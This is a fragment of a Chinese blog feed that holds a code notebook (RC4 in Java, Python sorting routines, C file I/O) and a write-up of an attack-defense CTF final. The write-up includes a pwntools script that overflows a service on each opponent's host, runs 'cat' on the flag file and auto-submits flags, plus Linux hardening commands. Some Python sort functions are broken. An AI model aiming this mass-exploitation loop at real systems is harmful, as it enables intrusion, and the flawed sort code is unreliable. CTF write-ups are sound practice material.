    <content type="html"><![CDATA[<p>记录一下代码，方便使用<br><a id="more"></a></p><h2 id="1、java"><a href="#1、java" class="headerlink" title="1、java"></a>1、java</h2><h4 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">HloveyRC4</span><span class="params">(String aInput,String aKey)</span>   </span></div><div class="line"><span class="function">   </span>&#123;   </div><div class="line">       <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];   </div><div class="line">       <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">           iS[i]=i;   </div><div class="line">             </div><div class="line">       <span class="keyword">int</span> j = <span class="number">1</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">short</span> i= <span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           iK[i]=(<span class="keyword">byte</span>)aKey.charAt((i % aKey.length()));   </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">255</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           j=(j+iS[i]+iK[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">       &#125;   </div><div class="line">     </div><div class="line">     </div><div class="line">       <span class="keyword">int</span> i=<span class="number">0</span>;   </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">       <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();   </div><div class="line">       <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];   </div><div class="line">       <span class="keyword">for</span>(<span class="keyword">short</span> x = <span class="number">0</span>;x&lt;iInputChar.length;x++)   </div><div class="line">       &#123;   </div><div class="line">           i = (i+<span class="number">1</span>) % <span class="number">256</span>;   </div><div class="line">           j = (j+iS[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">           <span class="keyword">int</span> t = (iS[i]+(iS[j] % <span class="number">256</span>)) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> iY = iS[t];   </div><div class="line">           <span class="keyword">char</span> iCY = (<span class="keyword">char</span>)iY;   </div><div class="line">           iOutputChar[x] =(<span class="keyword">char</span>)( iInputChar[x] ^ iCY) ;      </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);   </div><div class="line">                 </div><div class="line">   &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">  String inputStr = <span class="string">"7894dsfdsdfsd"</span>;      </div><div class="line">    String key = <span class="string">"abcdefg"</span>;         </div><div class="line">      </div><div class="line">    String str = HloveyRC4(inputStr,key);  </div><div class="line">      </div><div class="line">    <span class="comment">//打印加密后的字符串      </span></div><div class="line">    System.out.println(str);    </div><div class="line">      </div><div class="line">    <span class="comment">//打印解密后的字符串      </span></div><div class="line">    System.out.println(HloveyRC4(str,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="byte和Strings互转"><a href="#byte和Strings互转" class="headerlink" title="byte和Strings互转"></a>byte和Strings互转</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">String str = &quot;hello&quot;;</div><div class="line">byte[] srtbyte = null;</div><div class="line">try &#123;</div><div class="line">srtbyte = str.getBytes(&quot;UTF-8&quot;);</div><div class="line">String res = new String(srtbyte,&quot;UTF-8&quot;);</div><div class="line">System.out.println(res);</div><div class="line">    &#125; catch (UnsupportedEncodingException e) &#123;</div><div class="line">e.printStackTrace();</div><div class="line">    &#125;</div></pre></td></tr></table></figure><h2 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h2><p>8种排序，插入排序、希尔排序、冒泡排序、快速排序、直接选择排序、堆排序、归并排序、基数排序。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#插入排序,时间复杂度为O(n^2)。是稳定的排序方法。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count=len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count):</div><div class="line">        key=lst[i]</div><div class="line">        j=i<span class="number">-1</span></div><div class="line">        <span class="keyword">while</span> j&gt;=<span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> lst[j]&gt;key:</div><div class="line">                lst[j+<span class="number">1</span>]=lst[j]</div><div class="line">                lst[j]=key</div><div class="line">            j-=<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 希尔排序是插入排序的一种希尔排序是非稳定排序算法</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    step = <span class="number">2</span></div><div class="line">    group = count / step</div><div class="line">    <span class="keyword">while</span> group &gt; <span class="number">0</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, group):</div><div class="line">            j = i + group</div><div class="line">            <span class="keyword">while</span> j &lt; count:</div><div class="line">                k = j - group</div><div class="line">                key = lst[j]</div><div class="line">                <span class="keyword">while</span> k &gt;= <span class="number">0</span>:</div><div class="line">                    <span class="keyword">if</span> lst[k] &gt; key:</div><div class="line">                        lst[k + group] = lst[k]</div><div class="line">                        lst[k] = key</div><div class="line">                    k -= group</div><div class="line">                j += group</div><div class="line">        group /= step</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 冒泡排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[i] &gt; lst[j]:</div><div class="line">                lst[i], lst[j] = lst[j], lst[i]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 选择排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        min = i</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[min] &gt; lst[j]:</div><div class="line">                min = j</div><div class="line">        lst[min], lst[i] = lst[i], lst[min]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 快速排序,整个排序过程可以递归进行</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(lst, left, right)</span>:</span></div><div class="line">    <span class="keyword">if</span> left &gt;= right:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    key = lst[left]</div><div class="line">    low = left</div><div class="line">    high = right</div><div class="line">    <span class="keyword">while</span> left &lt; right:</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[right] &gt;= key:</div><div class="line">            right -= <span class="number">1</span></div><div class="line">        lst[left] = lst[right]</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[left] &lt;= key:</div><div class="line">            left += <span class="number">1</span></div><div class="line">        lst[right] = lst[left]</div><div class="line">    lst[right] = key</div><div class="line">    quick_sort(lst, low, left - <span class="number">1</span>)</div><div class="line">    quick_sort(lst, left + <span class="number">1</span>, high)</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment">#堆排序是指利用堆积树数据结构,它是选择排序的一种,堆分为大根堆和小根堆，是完全二叉树,大根堆的要求是每个节点的值都不大于其父节点的值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">adjust_heap</span><span class="params">(lst, i, size)</span>:</span></div><div class="line">    lchild = <span class="number">2</span> * i + <span class="number">1</span></div><div class="line">    rchild = <span class="number">2</span> * i + <span class="number">2</span></div><div class="line">    max = i</div><div class="line">    <span class="keyword">if</span> i &lt; size / <span class="number">2</span>:</div><div class="line">        <span class="keyword">if</span> lchild &lt; size <span class="keyword">and</span> lst[lchild] &gt; lst[max]:</div><div class="line">            max = lchild</div><div class="line">        <span class="keyword">if</span> rchild &lt; size <span class="keyword">and</span> lst[rchild] &gt; lst[max]:</div><div class="line">            max = rchild</div><div class="line">        <span class="keyword">if</span> max != i:</div><div class="line">            lst[max], lst[i] = lst[i], lst[max]</div><div class="line">            adjust_heap(lst, max, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_heap</span><span class="params">(lst, size)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, (size/<span class="number">2</span>))[::<span class="number">-1</span>]:</div><div class="line">        adjust_heap(lst, i, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    size = len(lst)</div><div class="line">    build_heap(lst, size)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size)[::<span class="number">-1</span>]:</div><div class="line">        lst[<span class="number">0</span>], lst[i] = lst[i], lst[<span class="number">0</span>]</div><div class="line">        adjust_heap(lst, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="comment">#归并排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left, right)</span>:</span></div><div class="line">    i, j = <span class="number">0</span>, <span class="number">0</span></div><div class="line">    result = []</div><div class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</div><div class="line">        <span class="keyword">if</span> left[i] &lt;= right[j]:</div><div class="line">            result.append(left[i])</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result.append(right[j])</div><div class="line">            j += <span class="number">1</span></div><div class="line">    result += left[i:]</div><div class="line">    result += right[j:]</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    <span class="comment"># 归并排序</span></div><div class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    num = len(lst) / <span class="number">2</span></div><div class="line">    left = merge_sort(lst[:num])</div><div class="line">    right = merge_sort(lst[num:])</div><div class="line"></div><div class="line"><span class="comment">#基数排序</span></div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">radix_sort</span><span class="params">(lst, radix=<span class="number">10</span>)</span>:</span></div><div class="line">    k = int(math.ceil(math.log(max(lst), radix)))</div><div class="line">    bucket = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(radix)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, k+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> lst:</div><div class="line">            bucket[j/(radix**(i<span class="number">-1</span>)) % (radix**i)].append(j)</div><div class="line">        <span class="keyword">del</span> lst[:]</div><div class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> bucket:</div><div class="line">            lst += z</div><div class="line">            <span class="keyword">del</span> z[:]</div><div class="line">    <span class="keyword">return</span> lst</div></pre></td></tr></table></figure></p><h2 id="3、java-apk"><a href="#3、java-apk" class="headerlink" title="3、java(apk)"></a>3、java(apk)</h2><h4 id="1、将字符串写在strings-xml里面"><a href="#1、将字符串写在strings-xml里面" class="headerlink" title="1、将字符串写在strings.xml里面"></a>1、将字符串写在strings.xml里面</h4><p>开发<br>apk-&gt;app-&gt;src-&gt;main-&gt;res-&gt;values-&gt;strings.xml<br><code>&lt;string name=&quot;user_name&quot;&gt;ESE_1996&lt;/string&gt;</code><br><code>name.getText().toString().equals(getResources().getString(R.string.user_name))</code><br>做题<br>Resources-&gt;resources.arsc-&gt;res-&gt;values-&gt;string.xml</p><h2 id="4、C"><a href="#4、C" class="headerlink" title="4、C"></a>4、C</h2><p>读取文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    FILE *stream;</div><div class="line">    <span class="keyword">char</span> <span class="built_in">list</span>[<span class="number">20000</span>];</div><div class="line">    <span class="keyword">int</span> start,end,fd,size;</div><div class="line">    <span class="keyword">int</span> i, numread, numwritten;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++ )</div><div class="line">        <span class="built_in">list</span>[i] = (<span class="keyword">char</span>)(<span class="string">'z'</span>);</div><div class="line">    start=clock();</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"w+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numwritten = fwrite( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"Problem opening the file\n"</span> );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"r+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numread = fread( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"File could not be opened\n"</span> );</div><div class="line">    &#125;</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fread all time：%d\n"</span>,end-start);</div><div class="line">    start=clock();</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_WRONLY|O_CREAT);</div><div class="line">    write(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_RDONLY);</div><div class="line">    size = read(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"read all time：%d\n"</span>,end-start);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下代码，方便使用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第四届MIAC线下总结</title>
    <link href="http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/"/>
    <id>http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/</id>
    <published>2017-12-04T06:58:52.428Z</published>
    <updated>2017-12-04T11:30:43.715Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习<br><a id="more"></a></p><h2 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h2><p>这是MIAC在决赛，这时不得不提初赛，第一个初赛直接被各种大佬打爆平台，导致所有队伍全部被改名字，主办方只好取消。后面两次虽然成功，但是结果仍然让我们出乎意料(一般都是前20进入决赛，这是前80，难以想象[这里后面证明是正确的])。</p><h2 id="2、比赛"><a href="#2、比赛" class="headerlink" title="2、比赛"></a>2、比赛</h2><p>比赛前一晚：看了比赛规则，发现有一台靶机和一台攻击机机（这是啥）,一小时一轮，一个三轮（后面怀疑主办方的说明，居然一个小时一个题目[一个5小轮]）。于是开始准备各种工具，自动提交flag脚本，通防工具，提取脚本，木马（后来都输给了主板方）。<br>比赛前:80个队伍，做得位置全部不知道（蒙）。终于进场了，都是找了好久，终于找到位置。发现我们只能用攻击机工具别人的靶机（类似实验吧）。<br>第一轮:葛师傅和潘师傅找到web题目，我在找pwn题目（最后，，，一个小时过去了，找不到题目，发现根本没有pwn题目），葛师傅很气愤，因为题目不能下下来。而且，自己电脑和靶机电脑是网络隔离的。不能用ssh连接。<br>第二轮:潘师傅和葛师傅找到mysql的弱密码，然后开始写文件进去，读文件出来，但是不知道为什么不能读到flag,而我只能在那里维护，看看那些ip来连接了我们，然后去杀掉pid.<br>第三轮:mysql的弱密码，这里可以读取flag了。可是这里主办方的flag不能及时刷新，导致我们提交的flag不对，这里问技术人员，他说赛后在谈论。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>1、首先这个比赛没有pwn题，那bin师傅只能看看屏幕了。<br>2、对比赛规则要仔细研究<br>3、liunx下的命令要熟悉</p><p>总结:<br>1、一上去可以连接上去，先备份一下所有的镜像文件。<br>2、修改自己的靶机（服务器）的密码，mysql的密码<br>3、看看有哪些题目<br>4、先挂上通防，等主办方来警告就撤下来</p><h2 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a>4、脚本</h2><p>这里pwn题自动提交flag脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(arch = <span class="string">'amd64'</span>)</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">start = time.time()</div><div class="line"><span class="comment">#p = process('./pwn')</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">28</span>):</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment">#if i == 25:</span></div><div class="line"><span class="comment">#continue</span></div><div class="line">p = remote(<span class="string">'172.16.%s.102'</span> % i,<span class="number">20002</span>)</div><div class="line">p.recv()</div><div class="line">payload=<span class="string">"a"</span>*<span class="number">213</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">timestart = time.time()</div><div class="line">p.sendline(<span class="string">'cat /home/newcalc/flag'</span>)</div><div class="line">a = p.recvline(timeout=<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"============="</span> </div><div class="line"><span class="keyword">print</span> a[<span class="number">2</span>:]</div><div class="line">url_platform = <span class="string">'http://172.16.200.3:9000/submit_flag/'</span></div><div class="line">token = <span class="string">'L4FBjK6K3nhkTcFMcwDGuWOwqR9GYbghNbtmOc49wjRiKS60SoILVjFgMpj3Etcx7R0wMIrB1os'</span></div><div class="line">post_data = &#123;</div><div class="line"><span class="string">'token'</span>:token,</div><div class="line"><span class="string">'flag'</span>:a[<span class="number">2</span>:]</div><div class="line">&#125;</div><div class="line">r = requests.post(url_platform, data = post_data)</div><div class="line">timenow = time.time()-timestart</div><div class="line"><span class="keyword">if</span>(timenow == <span class="number">5</span>):</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="comment">#p.interactive()</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">pass</span></div><div class="line">end = time.time()</div><div class="line">time.sleep(<span class="number">300</span> - (end -start))</div></pre></td></tr></table></figure></p><p>这里是liunx命令:<br>备份数据库<br><code>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql</code><br><code>mysqldump -u root -p 123456 mysql &gt; back.sql</code><br>备份所有数据库<br><code>mysqldump --all-databases &gt; bak.sql</code><br>还原数据库<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql   </div><div class="line">find / *.php -perm        </div><div class="line">awk -F:  /etc/passwd     </div><div class="line">crontab -l</div></pre></td></tr></table></figure></p><p>查看那些端口开放<br><code>netstat -pantu</code><br><img src="" alt=""><br><code>ps -anu</code><br><img src="" alt=""><br>杀死PID<br><code>kill 9511</code><br>查看tcp连接的数量<br><code>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn</code><br>找到某个文件<br><code>find / -name 文件名</code><br>解压<br><code>tar -xvf file.tar</code><br><code>unzip file.zip</code><br><code>unrar e file.rar</code><br>连接ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh root@192.168.1.14</div><div class="line">yes</div><div class="line">password</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>登录mysql数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql -u root -h -p123456</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>将/var/www/html目录下的文件设置为不允许任何人修改<br><code>chattr -R +i /var/www/html</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN之unlink</title>
    <link href="http://yoursite.com/2017/11/23/pwn_heap_1/"/>
    <id>http://yoursite.com/2017/11/23/pwn_heap_1/</id>
    <published>2017-11-23T02:40:36.492Z</published>
    <updated>2017-11-24T08:23:57.602Z</updated>
    
